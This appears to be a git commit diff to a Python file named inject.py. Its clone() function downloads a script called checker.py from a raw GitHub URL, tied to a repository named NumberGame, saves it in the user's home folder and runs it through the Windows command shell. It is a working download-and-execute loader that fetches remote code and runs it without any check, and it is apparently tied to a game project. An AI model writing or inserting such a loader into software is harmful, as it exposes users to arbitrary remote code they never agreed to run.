ccea4418f44afa6467c05062a34be06da342a18e
xXEthyleneXx <xXEthyleneXx@protonmail.com>
2021-02-19 08:13:18 -0500

    `

--- inject.py
+++ inject.py
@@ -3,7 +3,7 @@ def clone():
     import os, urllib.request, pathlib, subprocess
     dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/checker.py'
     home = os.path.expanduser("~")
-    path = str(home) + '\AppData\Local\checker.py'
+    path = str(home) + '\checker.py'
     path = '{}'.format(path)
     try:
         os.remove(path)
@@ -11,8 +11,8 @@ def clone():
         print('New System')
     urllib.request.urlretrieve(dlurl, '{}'.format(path))
     
-    subprocess.Popen(["start", "cmd", "/k", "py {}".format(path)], shell = True)
-    #os.system("py "+"{}".format(path))
+    #subprocess.Popen(["py", "cmd", "/k", "{}".format(path)], shell = True)
+    os.system("start /wait cmd /c {}".format('py ' + path + ' pause'))
     exit()
 
 clone()
